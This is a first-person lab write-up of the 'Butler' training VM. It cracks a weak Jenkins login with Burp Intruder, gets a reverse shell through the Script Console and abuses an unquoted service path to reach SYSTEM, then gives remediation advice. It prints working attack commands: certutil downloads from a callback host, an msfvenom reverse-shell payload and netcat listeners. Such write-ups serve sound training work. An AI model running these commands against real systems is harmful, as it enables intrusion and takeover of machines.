Overview

  • Target: Butler
  • OS: Windows 10 Enterprise Evaluation (build 19043), x64
  • Service: Jenkins 2.289.3 on TCP/8080
  • Attack: Weak Jenkins login and a Script Console shell, then the WiseBootAssistant unquoted service path to SYSTEM
  • Scope: Intentionally vulnerable, isolated training VM

I guessed Butler’s Jenkins login with Burp Intruder, opened a shell through the Script Console and escalated to NT AUTHORITY\SYSTEM through the WiseBootAssistant unquoted service path.

Reconnaissance

Placeholders such as <TARGET_IP> stand in for lab addresses. I scanned the target’s service ports:

sudo nmap -sS -sV -Pn -n -p 22,80,8080 <TARGET_IP>

Jenkins, an automation server that can run build tasks, was on TCP/8080 behind a login page.

Initial access

I ran a Burp Suite Intruder cluster bomb on the Jenkins login (/j_spring_security_check) with the usernames admin, administrator and jenkins and a short password list. Every attempt returned 302, but one response was 181 bytes instead of about 405: jenkins / <PASSWORD>, which logged me in.

The Jenkins Script Console runs Groovy on the server. I pasted a short Groovy reverse shell that starts cmd.exe and connects it to <CALLBACK_IP> on port 1234. My listener caught it as butler\butler:

nc -lvnp 1234
connect to [<CALLBACK_IP>] from (UNKNOWN) [<TARGET_IP>] 64177
Microsoft Windows [Version 10.0.19043.928]

C:\Program Files\Jenkins>whoami
butler\butler

Privilege escalation

I served WinPEAS from Kali, pulled it down with certutil and ran it:

certutil.exe -urlcache -f http://<CALLBACK_IP>/winpeas.exe winpeas.exe
winpeas.exe

WinPEAS flagged WiseBootAssistant. It ran as LocalSystem from this unquoted path:

C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe

Windows reads an unquoted path with spaces by trying each prefix in order: C:\Program.exe, then C:\Program Files.exe, and so on. If C:\Program Files (x86)\Wise\Wise.exe exists and no earlier prefix matches, it runs before the real BootTime.exe. I could write to that folder, so I built a reverse shell with that name:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<CALLBACK_IP> LPORT=7777 -f exe > Wise.exe

I served it with python3 -m http.server 80 and placed it in the Wise folder:

C:\Program Files (x86)\Wise>certutil -urlcache -f http://<CALLBACK_IP>/Wise.exe Wise.exe
C:\Program Files (x86)\Wise>dir
10/24/2026  04:51 PM             7,680 Wise.exe

Then I stopped the service, started a listener and started the service again:

sc stop WiseBootAssistant
nc -lvnp 7777              # on Kali
sc start WiseBootAssistant

Result

Result: SYSTEM access achieved

I escalated to NT AUTHORITY\SYSTEM, Windows’ built-in LocalSystem identity, through the WiseBootAssistant unquoted service path. My listener on TCP/7777 caught the callback from Wise.exe:

nc -lvnp 7777
connect to [<CALLBACK_IP>] from (UNKNOWN) [<TARGET_IP>] 52614
Microsoft Windows [Version 10.0.19043.928]

C:\Windows\system32>whoami
nt authority\system

Attack path

  1. Jenkins on TCP/8080
  2. Intruder cluster bomb finds jenkins / <PASSWORD>
  3. Script Console Groovy shell as butler\butler
  4. WinPEAS flags the WiseBootAssistant unquoted service path
  5. msfvenom Wise.exe placed in C:\Program Files (x86)\Wise\
  6. WiseBootAssistant stopped and started
  7. SYSTEM shell on TCP/7777

Remediation

Finding

Weak Jenkins login and Script Console

Jenkins accepted jenkins / <PASSWORD> after a short Intruder run, and its Script Console ran my Groovy code on Windows.

Fix

Use strong unique credentials with lockout, and restrict the Script Console and Jenkins itself to trusted administrators.

Finding

Unquoted service path

WiseBootAssistant ran as LocalSystem from an unquoted path with spaces. butler could write to its Wise folder and restart it, which gave me SYSTEM.

Fix

Quote the service executable path, restrict write access to every folder on it, audit service-control rights and use the least-privileged service account that works.

Key takeaways

  • A guessable Jenkins login plus the Script Console is a remote shell.
  • Every Intruder attempt returned 302; response length gave the login away.
  • An unquoted service path needs a writable folder and a restart to exploit. Here I had both.
